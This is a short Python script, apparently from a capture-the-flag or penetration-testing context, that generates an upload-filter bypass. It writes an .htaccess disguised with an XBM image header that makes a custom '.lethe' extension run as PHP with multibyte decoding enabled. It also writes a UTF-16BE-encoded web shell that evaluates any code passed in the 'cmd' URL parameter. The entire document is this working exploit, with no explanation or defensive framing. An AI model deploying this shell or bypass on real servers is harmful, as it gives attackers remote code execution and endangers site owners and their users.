SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
	phpfile = open(filename, 'wb') 

	phpfile.write(script.encode('utf-16be'))
	phpfile.write(SIZE_HEADER)

	phpfile.close()

def generate_htacess():
	htaccess = open('.htaccess', 'wb')

	htaccess.write(SIZE_HEADER)
	htaccess.write(b'AddType application/x-httpd-php .lethe\n')
	htaccess.write(b'php_value zend.multibyte 1\n')
	htaccess.write(b'php_value zend.detect_unicode 1\n')
	htaccess.write(b'php_value display_errors 1\n')

	htaccess.close()
		
generate_htacess()

generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")